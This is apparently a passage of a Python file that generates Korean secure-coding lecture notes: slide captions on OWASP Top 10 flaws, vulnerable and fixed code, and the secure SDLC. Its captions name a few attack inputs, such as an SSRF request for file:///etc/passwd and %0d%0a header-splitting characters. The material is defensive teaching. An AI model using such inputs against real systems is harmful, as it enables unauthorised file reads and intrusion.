        "pickle 역직렬화 취약점",
        "신뢰할 수 없는 pickle 데이터를 역직렬화하면 애플리케이션이 악성 데이터를 로드하면서 시스템에서 악성 코드를 실행할 수 있다.",
    )
    sc03_logging_list = screen_figure(
        "secure-coding",
        sc03,
        53,
        "Security Logging and Monitoring Failures",
        "로그 백업 절차 부재, 불명확한 로깅, 실시간 활동 로깅 불가, 주기적 백업 부재는 사고 분석과 대응을 어렵게 만든다.",
    )
    sc03_logging_code = screen_figure(
        "secure-coding",
        sc03,
        59,
        "로그 작성 부족 예시",
        "로그인 성공·실패 메시지만 출력하고 실제 보안 로그를 남기지 않으면 공격자의 활동이나 침입 시점을 특정하기 어렵다.",
    )
    sc03_owasp_summary = screen_figure(
        "secure-coding",
        sc03,
        67,
        "OWASP Top 10 전체 정리",
        "A01부터 A10까지 접근 제어, 암호화, 인젝션, 설계, 설정, 구성요소, 인증, 무결성, 로깅, SSRF 취약점을 전체적으로 정리한다.",
    )
    sc03_juice_shop = screen_figure(
        "secure-coding",
        sc03,
        69,
        "OWASP Juice Shop",
        "OWASP Juice Shop은 웹 취약점을 실제 서비스 형태에서 실습해 볼 수 있는 워게임형 학습 자원이다.",
    )
    sc04 = "시큐어코딩-04-입력-데이터-검증-1부"
    sc04_outline = screen_figure(
        "secure-coding",
        sc04,
        3,
        "입력 데이터 검증 및 표현 범위",
        "4강은 입력 데이터 검증 및 표현 중 SQL Injection, Code Injection, Path Traversal, XSS, Command Injection, File Upload를 다룬다.",
    )
    sc04_sql_flow = screen_figure(
        "secure-coding",
        sc04,
        11,
        "SQL Injection 공격 흐름",
        "공격자가 조작된 요청을 보내면 웹 서버가 의도와 다른 조작된 질의를 DB에 전달하고, 그 결과가 공격자에게 응답될 수 있다.",
    )
    sc04_sql_vulnerable = screen_figure(
        "secure-coding",
        sc04,
        21,
        "SQL Injection 취약 코드",
        "사용자 입력인 name과 content_id를 문자열 연결로 SQL에 직접 넣으면 입력값이 쿼리 문법으로 해석될 수 있다.",
    )
    sc04_sql_safe = screen_figure(
        "secure-coding",
        sc04,
        23,
        "SQL Injection 방어 코드",
        "쿼리에는 %s 자리표시자를 두고 사용자 입력은 execute의 인자로 바인딩하면 입력이 쿼리 문법이 아니라 데이터로 처리된다.",
    )
    sc04_code_flow = screen_figure(
        "secure-coding",
        sc04,
        27,
        "Code Injection 공격 흐름",
        "파이썬 코드가 삽입된 요청이 서버로 전달되고 검증 과정이 없으면 서버가 그 코드를 실행한 결과를 응답할 수 있다.",
    )
    sc04_code_vulnerable = screen_figure(
        "secure-coding",
        sc04,
        31,
        "eval 사용 취약 코드",
        "POST message 값을 검증하지 않고 eval에 전달하면 사용자가 보낸 문자열이 서버에서 파이썬 코드처럼 실행될 수 있다.",
    )
    sc04_code_safe = screen_figure(
        "secure-coding",
        sc04,
        35,
        "Code Injection 입력 제한 예시",
        "입력값을 영문과 숫자로 제한하고 특수문자가 포함된 경우 에러로 보내면 코드 구문 삽입 가능성을 줄일 수 있다.",
    )
    sc04_path_flow = screen_figure(
        "secure-coding",
        sc04,
        39,
        "Path Traversal 공격 흐름",
        "다운로드 URL의 filename과 path를 조작해 상위 디렉터리로 이동하면 서버의 시스템 파일 접근으로 이어질 수 있다.",
    )
    sc04_path_vulnerable = screen_figure(
        "secure-coding",
        sc04,
        43,
        "Path Traversal 취약 코드",
        "확장자만 확인하고 request_file을 그대로 open에 사용하면 공격자가 조작한 경로가 파일 처리에 들어갈 수 있다.",
    )
    sc04_path_safe = screen_figure(
        "secure-coding",
        sc04,
        47,
        "Path Traversal 방어 코드",
        "파일명에서 .., /, 역슬래시를 제거하고 예외 처리를 두어 경로 조작 문자열이 파일 접근에 쓰이지 않게 한다.",
    )
    sc04_xss_flow = screen_figure(
        "secure-coding",
        sc04,
        51,
        "XSS 공격 흐름",
        "공격 스크립트가 포함된 게시글을 등록하면 다른 사용자가 게시글을 열 때 브라우저에서 공격자 스크립트가 실행될 수 있다.",
    )
    sc04_xss_code = screen_figure(
        "secure-coding",
        sc04,
        55,
        "mark_safe 사용 XSS 취약 코드",
        "외부 입력으로 만든 HTML 링크를 mark_safe로 안전하다고 표시하면 Django의 기본 XSS escape 정책을 우회하게 된다.",
    )
    sc04_command_vulnerable = screen_figure(
        "secure-coding",
        sc04,
        63,
        "Command Injection 취약 코드",
        "POST로 받은 app_name 값을 제한 없이 os.system에 전달하면 공격자가 원하는 시스템 명령이 실행될 수 있다.",
    )
    sc04_command_safe = screen_figure(
        "secure-coding",
        sc04,
        67,
        "Command Injection 화이트리스트 방어",
        "허용된 프로그램 목록에 포함된 값만 os.system에 전달하고, 그 외 입력은 에러 처리한다.",
    )
    sc04_upload_vulnerable = screen_figure(
        "secure-coding",
        sc04,
        71,
        "File Upload 취약 코드",
        "업로드 파일의 크기, 개수, 확장자, 타입을 검증하지 않고 저장하면 악성 파일 업로드로 이어질 수 있다.",
    )
    sc04_upload_safe = screen_figure(
        "secure-coding",
        sc04,
        75,
        "File Upload 제한 적용 코드",
        "파일 개수, 크기, content_type, 확장자 화이트리스트를 검사해 의도한 이미지 파일만 저장하도록 제한한다.",
    )
    sc05 = "시큐어코딩-05-입력-데이터-검증-2부"
    sc05_csrf_flow = screen_figure(
        "secure-coding",
        sc05,
        3,
        "CSRF 공격 흐름",
        "공격자가 CSRF 스크립트가 포함된 게시글을 등록하면 사용자가 게시글을 열 때 사용자의 권한으로 의도하지 않은 서비스 요청이 발생할 수 있다.",
    )
    sc05_csrf_disabled = screen_figure(
        "secure-coding",
        sc05,
        11,
        "Django CSRF 방어 기능 해제 예시",
        "CSRF 미들웨어를 주석 처리하거나 csrf_exempt 데코레이터를 사용하면 Django의 기본 CSRF 유효성 검사가 제거될 수 있다.",
    )
    sc05_ssrf_flow = screen_figure(
        "secure-coding",
        sc05,
        15,
        "SSRF 공격 흐름",
        "공격자가 조작한 요청을 서버가 처리하면서 내부 서버로 전달하면 일반 사용자가 직접 접근할 수 없는 내부 리소스가 노출될 수 있다.",
    )
    sc05_ssrf_examples = screen_figure(
        "secure-coding",
        sc05,
        19,
        "SSRF 삽입 코드와 우회 예시",
        "사설 IP의 member/list.json, admin 페이지, 도메인 체크 우회, 단축 URL, file:///etc/passwd처럼 서버가 대신 요청할 수 있는 여러 삽입 패턴을 보여준다.",
    )
    sc05_ssrf_safe = screen_figure(
        "secure-coding",
        sc05,
        23,
        "SSRF 화이트리스트 방어 코드",
        "사용자가 입력한 URL을 그대로 요청하지 않고 허용된 서버 목록에 포함된 주소인지 검사한 뒤에만 requests.get을 수행한다.",
    )
    sc05_response_flow = screen_figure(
        "secure-coding",
        sc05,
        27,
        "HTTP Response Splitting 공격 흐름",
        "%0d%0a 같은 개행 구분자를 응답 헤더 값에 넣으면 서버가 의도하지 않은 새 헤더나 응답 본문을 만들 수 있다.",
    )
    sc05_response_example = screen_figure(
        "secure-coding",
        sc05,
        35,
        "HTTP Response Splitting 요청과 응답 예시",
        "user_id 값에 개행 문자가 삽입되면 응답에서 User_id 헤더 뒤에 새로운 헤더가 추가되는 방식으로 해석될 수 있다.",
    )
    sc05_response_safe = screen_figure(
        "secure-coding",
        sc05,
        39,
        "HTTP Response Splitting 방어 코드",
        "응답 헤더에 들어가는 외부 입력값에서 \\r, \\n 개행 문자를 제거한 뒤 Content-Type 헤더에 설정한다.",
    )
    sc05_integer_vulnerable = screen_figure(
        "secure-coding",
        sc05,
        43,
        "Integer Overflow 취약 코드",
        "np.int64 범위를 넘는 숫자와 지수가 들어오면 np.power 처리 과정에서 오버플로우가 발생할 수 있다.",
    )
    sc05_integer_safe = screen_figure(
        "secure-coding",
        sc05,
        47,
        "Integer Overflow 방어 코드",
        "NumPy int64 연산에 넣기 전에 파이썬 기본 정수로 계산한 결과가 int64의 최댓값과 최솟값을 벗어나는지 검사한다.",
    )
    sc05_format_vulnerable = screen_figure(
        "secure-coding",
        sc05,
        51,
        "Format String Injection 취약 코드",
        "사용자가 입력한 msg_format을 그대로 format 문자열로 사용하면 user_info나 내부 키 같은 민감 정보가 외부로 노출될 수 있다.",
    )
    sc05_format_safe = screen_figure(
        "secure-coding",
        sc05,
        55,
        "Format String Injection 방어 코드",
        "포맷 문자열은 개발자가 고정하고 사용자 데이터는 값으로만 넣어 사용자가 임의 포맷 구조를 만들 수 없게 한다.",
    )
    sc06 = "시큐어코딩-06-보안-기능과-시간-및-상태"
    sc06_outline = screen_figure(
        "secure-coding",
        sc06,
        3,
        "6강에서 다루는 보안 기능과 시간 및 상태",
        "보안 기능은 암호화 알고리즘, 하드코딩, 난수, 쿠키, 무결성, 반복 인증 제한을 다루고, 시간 및 상태는 Race Condition과 재귀·무한 루프를 다룬다.",
    )
    sc06_crypto_standard = screen_figure(
        "secure-coding",
        sc06,
        11,
        "암호 알고리즘 검증 기준",
        "블록암호, 해시함수, 메시지 인증, 난수발생기, 공개키 암호, 전자서명, 키 설정·유도 알고리즘마다 권장 알고리즘과 키 길이가 정해져 있다.",
    )
    sc06_des_code = screen_figure(
        "secure-coding",
        sc06,
        15,
        "DES 사용 취약 코드",
        "이미 오래된 DES와 ECB 모드를 사용하면 암호화했더라도 현재 컴퓨팅 환경에서 안전하지 않을 수 있다.",
    )
    sc06_hardcoding_flow = screen_figure(
        "secure-coding",
        sc06,
        17,
        "하드코딩된 암호 노출 흐름",
        "코드 안에 URL, 아이디, 비밀번호가 고정되어 있으면 공격자가 소프트웨어나 저장소 접근만으로 원하는 정보를 추출할 수 있다.",
    )
    sc06_hardcoding_bad = screen_figure(
        "secure-coding",
        sc06,
        19,
        "하드코딩 취약 코드",
        "DB host, port, user, passwd, db 이름을 소스 코드에 평문 문자열로 직접 넣으면 코드 유출 시 계정 정보도 함께 노출된다.",
    )
    sc06_hardcoding_safe = screen_figure(
        "secure-coding",
        sc06,
        23,
        "설정 파일과 복호화를 이용한 하드코딩 방지",
        "설정 파일에서 DB 정보를 읽고 암호화된 사용자명과 비밀번호를 복호화해 사용하면 코드가 노출되어도 비밀값 노출 위험을 줄일 수 있다.",
    )
    sc06_random_flow = screen_figure(
        "secure-coding",
        sc06,
        27,
        "안전하지 않은 난수 생성기 공격 흐름",
        "공격자가 난수 발생기를 분석하고 예측된 난수를 이용하면 원하는 데이터 열람이나 권한 획득으로 이어질 수 있다.",
    )
    sc06_random_code = screen_figure(
        "secure-coding",
        sc06,
        31,
        "random과 secrets 난수 생성 비교",
        "보안용 OTP에는 시간 기반으로 예측 가능한 random보다 secrets.randbelow나 os.urandom 기반 난수를 사용하는 편이 안전하다.",
    )
    sc06_cookie_flow = screen_figure(
        "secure-coding",
        sc06,
        35,
        "쿠키 유출 위험 흐름",
        "사용자 PC가 감염되어 쿠키 파일의 주요 정보가 유출되면 공격자가 그 쿠키로 사용자처럼 접속할 수 있다.",
    )
    sc06_cookie_code = screen_figure(
        "secure-coding",
        sc06,
        39,
        "쿠키 유효기간과 secure, httpOnly 설정",
        "쿠키 만료시간을 1년처럼 길게 두지 말고 적절히 줄이며 secure와 httpOnly 옵션을 활성화해야 한다.",
    )
    sc06_integrity_code = screen_figure(
        "secure-coding",
        sc06,
        43,
        "무결성 검증 없는 원격 코드 다운로드",
        "신뢰할 수 없는 사이트에서 code.py를 다운로드해 저장하면 중간자 공격이나 조작 파일 실행 위험이 생긴다.",
    )
    sc06_auth_limit = screen_figure(
        "secure-coding",
        sc06,
        47,
        "반복된 인증 시도 제한",
        "무작위 대입 공격을 계속 허용하면 언젠가 ID와 비밀번호 조합을 맞출 수 있으므로 시도 횟수와 시간을 제한해야 한다.",
    )
    sc06_race_flow = screen_figure(
        "secure-coding",
        sc06,
        55,
        "Race Condition TOCTOU 흐름",
        "파일 유무 검사 시점과 파일 사용 시점 사이에 다른 프로세스가 공유 자원을 변경하면 읽기 시도 오류 같은 문제가 생긴다.",
    )
    sc06_race_bad = screen_figure(
        "secure-coding",
        sc06,
        59,
        "Race Condition 취약 코드",
        "멀티스레드 환경에서 파일 존재 여부를 검사한 뒤 잠금 없이 파일을 열고 쓰면 검사와 사용 사이의 상태 변경에 취약하다.",
    )
    sc06_race_safe = screen_figure(
        "secure-coding",
        sc06,
        63,
        "Lock을 이용한 Race Condition 방어",
        "threading.Lock을 사용해 공유 파일 접근 구간을 한 스레드씩 처리하면 동시에 접근해 생기는 상태 충돌을 줄일 수 있다.",
    )
    sc06_recursive_flow = screen_figure(
        "secure-coding",
        sc06,
        67,
        "Recursive와 Infinite Loop의 자원 고갈",
        "종료되지 않는 반복문이나 재귀 호출은 CPU와 메모리를 계속 사용해 다른 프로세스의 정상 동작을 방해할 수 있다.",
    )
    sc06_recursive_code = screen_figure(
        "secure-coding",
        sc06,
        71,
        "재귀 함수 탈출 조건과 재귀 제한",
        "factorial 재귀 함수에 종료 조건을 두지 않으면 무한 호출이 발생하므로 기저 조건과 sys.setrecursionlimit 같은 제한을 둔다.",
    )

    sc07 = "시큐어코딩-07-에러-처리-코드-오류-API-오용"
    sc07_error_flow = screen_figure(
        "secure-coding",
        sc07,
        3,
        "오류 메시지 노출 공격 흐름",
        "SQL 오류 메시지처럼 내부 쿼리와 실패 지점이 드러나는 응답은 공격자가 다음 공격을 설계하는 힌트가 된다.",
    )
    sc07_django_default_error = screen_figure(
        "secure-coding",
        sc07,
        7,
        "Django 기본 오류 페이지의 정보 노출",
        "사용자 정의 오류 페이지를 설정하지 않으면 admin 경로, URL 패턴, DEBUG 상태 같은 내부 정보가 일반 사용자에게 보일 수 있다.",
    )
    sc07_error_handler = screen_figure(
        "secure-coding",
        sc07,
        11,
        "사용자 정의 오류 페이지 설정",
        "400, 403, 404, 500 오류를 직접 만든 오류 페이지로 연결해 사용자에게 내부 코드와 경로가 노출되지 않도록 한다.",
    )
    sc07_exception_flow = screen_figure(
        "secure-coding",
        sc07,
        15,
        "오류 상황 처리와 예외 입력",
        "예외를 발생시키는 입력을 받았을 때 프로그램이 종료되거나 경로와 데이터를 노출하면 공격자가 이를 활용할 수 있다.",
    )
    sc07_exception_crypto_bad = screen_figure(
        "secure-coding",
        sc07,
        19,
        "예외 발생 시 기본 암호화 키 사용",
        "키 인덱스 오류를 pass로 넘기면 0000000000000000 같은 기본 키로 암호화가 수행되어 평문 노출 위험이 커진다.",
    )
    sc07_exception_crypto_safe = screen_figure(
        "secure-coding",
        sc07,
        21,
        "예외 발생 시 랜덤 키 생성",
        "오류가 발생했을 때 취약한 기본 키로 빠지지 않고 secrets.token_bytes로 새 키와 IV를 생성하도록 처리한다.",
    )
    sc07_null_flow = screen_figure(
        "secure-coding",
        sc07,
        23,
        "Null Pointer 역참조 공격 흐름",
        "공격자가 객체 값을 Null로 설정하면 서버가 예상하지 못한 오류를 내고 비정상 경로나 내부 정보를 노출할 수 있다.",
    )
    sc07_null_vulnerable = screen_figure(
        "secure-coding",
        sc07,
        27,
        "filename None 검사 누락 코드",
        "filename이 None인지 확인하지 않고 count 메서드를 호출하면 Python 예외가 발생해 정상 로직이 중단될 수 있다.",
    )
    sc07_null_safe = screen_figure(
        "secure-coding",
        sc07,
        29,
        "filename None 및 빈 문자열 검사",
        "filename이 None이거나 공백뿐이면 안전한 오류 페이지를 반환하고 XML 처리 로직으로 넘어가지 않는다.",
    )
    sc07_deserialization_flow = screen_figure(
        "secure-coding",
        sc07,
        31,
        "신뢰할 수 없는 역직렬화 흐름",
        "공격자가 코드가 포함된 직렬화 데이터를 보내고 서버가 이를 그대로 역직렬화하면 원격 코드 실행과 시스템 장악으로 이어질 수 있다.",
    )
    sc07_pickle_unsafe = screen_figure(
        "secure-coding",
        sc07,
        33,
        "무검증 pickle 역직렬화 코드",
        "사용자 입력을 pickle.loads로 바로 복원하면 직렬화 데이터 내부에 숨은 악성 동작을 서버에서 실행할 수 있다.",
    )
    sc07_pickle_hmac = screen_figure(
        "secure-coding",
        sc07,
        35,
        "HMAC 기반 pickle 무결성 검증",
        "전달받은 해시값과 서버가 계산한 HMAC 값을 비교한 뒤 일치할 때만 pickle 데이터를 로드한다.",
    )
    sc07_dns_flow = screen_figure(
        "secure-coding",
        sc07,
        43,
        "DNS Lookup에 의존한 보안 결정",
        "DNS 응답이 조작되면 www.bank.kr이 정상 IP가 아니라 공격자 IP로 해석되어 사용자가 위장 사이트에 접속할 수 있다.",
    )
    sc07_dns_code = screen_figure(
        "secure-coding",
        sc07,
        47,
        "도메인 비교 대신 IP 비교",
        "도메인 문자열만 비교하는 방식은 DNS 변조에 취약하므로 실제 해석된 IP를 신뢰할 수 있는 IP와 비교한다.",
    )
    sc07_vulnerable_api = screen_figure(
        "secure-coding",
        sc07,
        51,
        "취약한 API와 패키지 사용",
        "취약한 패키지를 API로 호출하면 버퍼 오버플로우, XML 취약점, 임의 코드 실행 같은 보안 문제가 프로그램으로 전파될 수 있다.",
    )

    sc08 = "시큐어코딩-08-시큐어-SDLC"
    sc08_outline = screen_figure(
        "secure-coding",
        sc08,
        3,
        "시큐어 SDLC 강의 목차",
        "8강은 리스크 감소, Secure Software Development Cycle, Requirements, Threat Modeling 순서로 진행된다.",
    )
    sc08_reduce_risk = screen_figure(
        "secure-coding",
        sc08,
        11,
        "리스크를 줄이는 방법",
        "보안 솔루션 적용뿐 아니라 설계부터 보안을 고려하고 소프트웨어 복잡도를 낮추는 것이 리스크 감소의 핵심이다.",
    )
    sc08_sdlc_three = screen_figure(
        "secure-coding",
        sc08,
        15,
        "Secure Software Development Cycle 3단계",
        "소프트웨어 개발 주기는 정의 단계, 개발 단계, 유지보수 단계로 나눌 수 있으며 각 단계에서 보안을 고려해야 한다.",
    )
    sc08_microsoft_sdl = screen_figure(
        "secure-coding",
        sc08,
        23,
        "Microsoft Security Software Development Life Cycle",
        "Microsoft SDL은 교육, 계획/분석, 설계, 구현, 시험/검증, 배포/운영, 대응의 7단계를 제시한다.",
    )
    sc08_requirements_specific = screen_figure(
        "secure-coding",
        sc08,
        31,
        "구체적인 보안 요구사항",
        "민감정보 암호화처럼 추상적인 요구사항보다 전송과 수신 시점, 암호화 방식까지 구체적으로 명시해야 구현 결과가 달라지지 않는다.",
    )
    sc08_principles = screen_figure(
        "secure-coding",
        sc08,
        43,
        "요구사항 도출 시 고려할 보안 원칙",
        "Least Privilege, Fail-Safe Defaults, Open Design, Defense in Depth, Effective Logging, Build in Not Bolt On 등 여러 보안 원칙을 요구사항과 설계에 반영한다.",
    )
    sc08_blp = screen_figure(
        "secure-coding",
        sc08,
        51,
        "BLP 보안 정책 모델",
        "Bell-LaPadula 모델은 기밀성 유지를 위해 No read up과 No write down 규칙을 사용한다.",
    )
    sc08_architecture = screen_figure(
        "secure-coding",
        sc08,
        55,
        "위협 모델링을 위한 설계 도면 예시",
        "설계 도면을 바탕으로 어떤 데이터가 어디서 어디로 이동하고 어느 지점에서 처리되는지 확인해야 한다.",
    )
    sc08_threat_modeling_steps = screen_figure(
        "secure-coding",
        sc08,
        59,
        "Threat Modeling 절차",
        "데이터 흐름 확인, 보호 대상 식별, 알려진 공격 시나리오 도출, 위험도 산정과 대응책 마련, 반복 개선 순서로 진행한다.",
    )
    sc08_risk_methods = screen_figure(
        "secure-coding",
        sc08,
        67,
        "위험을 처리하는 네 가지 방법",
        "항상 완전히 무결한 소프트웨어를 만들 수는 없으므로 Risk Accept, Risk Avoid, Risk Transfer, Risk Reduce를 상황에 맞게 선택한다.",
    )
    sc08_summary = screen_figure(
        "secure-coding",
        sc08,
        79,
        "시큐어 SDLC 전체 정리",
        "리스크 감소, Secure SDLC, 요구사항, 위협 모델링의 흐름으로 시큐어 코딩 전체 강의를 마무리한다.",
    )

    return [
        {
            "id": "1-1",
            "title": "강의 오리엔테이션과 시큐어 코딩 개요",
            "subtitle": "시큐어 코딩의 정의, 소프트웨어 개발 과정에서의 위치, 도입 배경과 중요성을 정리한다.",
            "tags": ["시큐어 코딩", "SDLC", "보안 약점"],
            "objectives": [
                "시큐어 코딩을 소프트웨어 취약점을 방지하고 공격으로부터 보호하기 위한 기법과 프로세스로 이해한다.",
                "소프트웨어 개발 전체 과정과 실제 코딩 단계에서 시큐어 코딩이 맡는 위치를 구분한다.",
                "시큐어 코딩이 법제화되고 산업적으로 중요해진 배경을 설명한다.",
                "취약점 발견 시점이 늦어질수록 수정 비용이 커지는 이유를 이해한다.",
                "대표 시큐어 코딩 기법의 큰 분류를 기억한다.",
            ],
            "sections": [
                {
                    "heading": "강의 소개와 전체 흐름",
                    "body": f"""
                    <p>강의는 화이트햇 멘토 유효곤 강사의 소개로 시작한다. 강사는 카이스트 김재철AI대학원 석사 과정에 있으며, 고려대학교 사이버국방학과와 취약점 분석 트랙에서 정보보안 관련 활동을 해 왔다고 소개한다.</p>
                    <p>시큐어 코딩 과목은 먼저 시큐어 코딩이 무엇인지 설명하고, 취약점 및 공격 유형을 소개한 뒤, 네 개 강의에 걸쳐 시큐어 코딩 기법을 구체적으로 다룬다. 마지막 강의에서는 시큐어 소프트웨어 개발 생명주기, 즉 코드 구현뿐 아니라 개발 전 과정에서 더 안전한 소프트웨어를 만드는 방법을 다룬다.</p>
                    {sc01_outline}
                    <div class="timeline">
                      <div><strong>1</strong><p>시큐어 코딩의 의미와 배경</p></div>
                      <div><strong>2-3</strong><p>OWASP Top 10 기반 취약점과 공격 유형</p></div>
                      <div><strong>4-7</strong><p>입력 검증, 보안 기능, 시간·상태, 에러 처리, 코드 오류, API 오용</p></div>
                      <div><strong>8</strong><p>시큐어 SDLC, 요구사항, 위협 모델링, 리스크 처리</p></div>
                    </div>
                    """,
                },
                {
                    "heading": "시큐어 코딩의 정의",
                    "body": f"""
                    <p>강의에서 시큐어 코딩은 <strong>소프트웨어 취약점을 방지하고 공격으로부터 보호하기 위한 기법과 프로세스</strong>로 설명된다. 퍼징, BOF, ROP처럼 특정 기술 이름이 있는 영역과 달리, 시큐어 코딩은 개발자가 소프트웨어를 만들 때 지켜야 하는 코딩 습관과 약속, 그리고 개발 프로세스에 가깝다.</p>
                    {sc01_definition}
                    <p>숙련된 소프트웨어 개발자라면 기능이 동작하는 코드를 작성하는 것에 그치지 않고, 알려진 보안 약점이 들어가지 않도록 코딩해야 한다. 즉 시큐어 코딩은 “보안 전문가만 하는 별도 작업”이 아니라 개발 과정 안에서 자연스럽게 따라야 하는 품질 기준이다.</p>
                    <p>강사는 보안 분야의 여러 세부 기술과 달리 시큐어 코딩은 특정 공격 하나를 배우는 시간이 아니라고 설명한다. 소프트웨어를 만들 때 취약점이 생기지 않도록 요구사항, 구현 습관, 검토 기준, 테스트 관점을 함께 갖추는 것이 핵심이다.</p>
                    """,
                },
                {
                    "heading": "소프트웨어 개발 과정에서의 위치",
                    "body": f"""
                    <p>소프트웨어는 코딩만으로 완성되지 않는다. 예를 들어 배달 플랫폼을 만든다고 하면, 먼저 어떤 서비스를 만들지 계획하고, 가게 등록·메뉴 등록·주문·배달 같은 기능을 생각한다. 그다음 그 기능들이 소프트웨어 요구사항으로 구체화되고, 기능 배치와 프로세스가 설계된다. 실제 Python이나 C 같은 언어로 구현하는 과정은 그 뒤에 나온다.</p>
                    {sc01_sdlc}
                    <table>
                      <thead><tr><th>단계</th><th>강의에서의 의미</th></tr></thead>
                      <tbody>
                        <tr><td>계획</td><td>어떤 소프트웨어를 만들지, 어떤 서비스와 기능이 필요한지 생각한다.</td></tr>
                        <tr><td>요구사항 도출</td><td>사용자 요청, 주문 처리, API 등 실제 기능으로 필요한 조건을 구체화한다.</td></tr>
                        <tr><td>설계</td><td>요구사항을 어떤 구조와 흐름으로 배치할지 정한다.</td></tr>
                        <tr><td>구현</td><td>개발자가 코드로 기능을 만든다. 시큐어 코딩은 주로 이 단계에 집중한다.</td></tr>
                        <tr><td>테스트</td><td>기능이 잘 동작하는지, 대표 취약점이 없는지 점검한다.</td></tr>
                        <tr><td>배포와 유지보수</td><td>실제 서비스하고 수정, 패치, 운영을 이어 간다.</td></tr>
                      </tbody>
                    </table>
                    <p>보안 약점은 계획, 요구사항, 설계, 테스트, 운영 과정에서도 생길 수 있다. 하지만 이 과목에서 말하는 시큐어 코딩은 그중 실제 개발·구현 단계에서 생기는 보안 약점을 줄이는 데 초점을 둔다.</p>
                    {sc01_development_stage}
                    <p>화면에서 강조된 Stage 4 Development에는 Coding Standard, Scalable Code, Version Control, Code Review가 포함된다. 강사는 이 단계에서 개발자가 실제 코드를 작성하므로, 보안 약점이 들어가지 않도록 미리 확인하고 제거하는 작업이 시큐어 코딩의 직접적인 대상이라고 설명한다.</p>
                    """,
                },
                {
                    "heading": "도입 배경과 중요성",
                    "body": f"""
                    <p>미국은 2002년부터 시큐어 코딩 필요성을 법제화했고, Microsoft는 2006년 Windows 개발부터 시큐어 코딩 프로세스를 선제적으로 도입했다. 우리나라도 2012년부터 소프트웨어 개발 보안 의무제를 시행하며 안전한 소프트웨어 개발을 위한 노력을 이어 왔다.</p>
                    <p>시큐어 코딩이 중요한 이유는 침해 사고 상당수가 이미 알려진 취약점을 패치하지 않아 발생하기 때문이다. 강의에서는 침해 사고를 겪은 기업 중 약 60%가 알려진 취약점을 패치하지 않은 것이 원인이었고, 약 62%는 취약점 존재 자체를 알지 못했다고 설명한다. 알려진 취약점을 확인하고 패치했거나, 처음부터 안전하게 코딩했다면 줄일 수 있었던 사고라는 뜻이다.</p>
                    {sc01_known_vulns}
                    <p>침입 탐지 시스템, 안티바이러스 같은 보안 제품은 보안 수준을 높이는 데 도움이 된다. 하지만 소프트웨어 자체에 존재하는 근본적인 보안 취약점을 이용하는 공격은 그런 제품만으로 막기 어렵다. 예를 들어 정상 사용자가 웹페이지 기능을 쓰는 것처럼 보이지만, 실제로는 소프트웨어 취약점을 악용하는 공격이라면 개발 단계에서 취약점을 줄여야 한다.</p>
                    <p>따라서 보안은 제품을 사서 붙이는 문제만이 아니다. 공격자가 합법적인 요청처럼 보이는 입력을 보내 취약한 코드 경로를 타게 만들면, 외부 보안 장비는 그 요청을 단순 정상 사용으로 볼 수 있다. 이 경우 근본적인 대응은 취약한 코드 자체를 만들지 않거나 빠르게 고치는 것이다.</p>
                    """,
                },
                {
                    "heading": "수정 비용과 개발 보안 생명주기",
                    "body": f"""
                    <p>취약점은 늦게 발견될수록 수정 비용이 커진다. 요구사항 도출 단계에서 발견해 고치는 비용을 1이라고 하면, 코딩 단계에서 고칠 때 약 7배, 테스트 단계에서 고칠 때 약 15배, 배포 후 실제 사용 중 발견될 때는 30배에서 100배까지 커질 수 있다고 설명한다.</p>
                    {sc01_cost}
                    <p>그래서 보안 약점을 미리 확인하고 제거하는 것은 안전성뿐 아니라 비용 측면에서도 중요하다. 전체 소프트웨어 개발 생명주기에 보안을 고려하는 방법이 Security Development Life Cycle이다. 요구사항 단계에서는 보안 요구사항을 도출하고 리스크 분석을 하며, 설계 단계에서는 위협 모델링을 수행한다. 이 과목의 시큐어 코딩은 그중 구현 단계에 해당한다.</p>
                    {sc01_sdl}
                    <p>SDL 관점에서는 분석 단계에서 보안 요구사항과 리스크 분석을 하고, 설계 단계에서 안전한 설계와 위협 모델링을 수행한다. 구현 단계에서는 시큐어 코딩, 디자인 리뷰, 코드 리뷰를 통해 개발자가 만든 코드가 보안 요구사항을 깨지 않는지 확인한다. 이후 검증, 배포, 사고 대응까지 이어지므로 시큐어 코딩은 전체 보안 개발 과정의 한 축으로 봐야 한다.</p>
                    """,
                },
                {
                    "heading": "대표 시큐어 코딩 기법 분류",
                    "body": f"""
                    <p>강의는 앞으로 다룰 대표 시큐어 코딩 기법을 여러 범주로 나눈다. 사용자 입력을 제대로 검증하는 입력 데이터 검증, 보안 기능 적용, 시간 및 상태 처리, 에러 처리, 코드 오류 방지, 캡슐화, API 오용 방지 등이 모두 시큐어 코딩 과정에서 신경 써야 할 요소다.</p>
                    {sc01_techniques}
                    <table>
                      <thead><tr><th>분류</th><th>의미</th></tr></thead>
                      <tbody>
                        <tr><td>입력 데이터 검증</td><td>악의적 입력이 코드와 DB, 명령어, 브라우저에서 의도하지 않은 동작을 만들지 않게 한다.</td></tr>
                        <tr><td>보안 기능</td><td>암호화, 인증 시도 제한, 무결성 검증 같은 보안 기능을 올바르게 사용한다.</td></tr>
                        <tr><td>시간 및 상태</td><td>멀티스레딩, 파일 접근, 반복문, 재귀 호출에서 시간 차이와 상태 변화로 생기는 문제를 막는다.</td></tr>
                        <tr><td>에러 처리</td><td>오류 메시지와 예외 상황이 공격자에게 힌트를 주지 않게 한다.</td></tr>
                        <tr><td>코드 오류와 API 오용</td><td>널 값, 역직렬화, DNS lookup, 취약 API 사용 같은 개발 실수를 줄인다.</td></tr>
                      </tbody>
                    </table>
                    """,
                },
            ],
            "checks": [
                "시큐어 코딩이 특정 공격 기술이 아니라 개발 과정의 보안 기법과 프로세스라는 점을 설명할 수 있는가?",
                "소프트웨어 개발 6단계 중 시큐어 코딩이 주로 구현 단계에 집중한다는 점을 이해했는가?",
                "보안 제품 도입만으로 소프트웨어 자체 취약점을 막기 어려운 이유를 말할 수 있는가?",
                "취약점 발견 시점이 늦어질수록 수정 비용이 증가하는 이유를 설명할 수 있는가?",
                "입력 검증, 보안 기능, 시간·상태, 에러 처리, 코드 오류, API 오용의 큰 분류를 말할 수 있는가?",
            ],
        },
        {
            "id": "1-2",
            "title": "OWASP Top 10 1부",
            "subtitle": "OWASP Top 10의 의미와 Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration을 정리한다.",
            "tags": ["OWASP", "접근 제어", "Injection"],
            "objectives": [
                "OWASP Top 10이 웹 애플리케이션 보안에서 널리 쓰이는 취약점 기준임을 이해한다.",
                "Broken Access Control의 의미와 최소 권한 원칙을 설명한다.",
                "Cryptographic Failures가 민감정보 노출로 이어지는 이유를 이해한다.",
                "Injection 공격이 사용자 입력을 서버 명령이나 쿼리로 바꾸는 문제임을 설명한다.",
